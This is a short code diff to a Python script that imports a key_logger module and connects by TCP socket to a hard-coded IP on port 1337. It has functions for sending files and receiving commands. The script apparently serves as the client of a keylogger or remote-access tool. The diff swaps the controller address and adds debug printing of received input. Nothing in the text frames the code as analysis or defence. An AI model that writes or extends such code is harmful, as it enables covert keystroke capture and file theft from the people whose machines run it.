@@ -10,7 +10,8 @@ import key_logger
 path = ""
 def main():
     soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    host = '192.168.43.85'
+    #host = '192.168.43.85'
+    host = '192.168.0.101'
     port = 1337
 
     try:
@@ -76,6 +77,7 @@ def send_file(fname, c):
 
 def receive_input(connection, max_buffer_size):
     client_input = connection.recv(max_buffer_size)
+    print(client_input)
     if(client_input):
         decoded_input = client_input.decode("utf8")
         return decoded_input
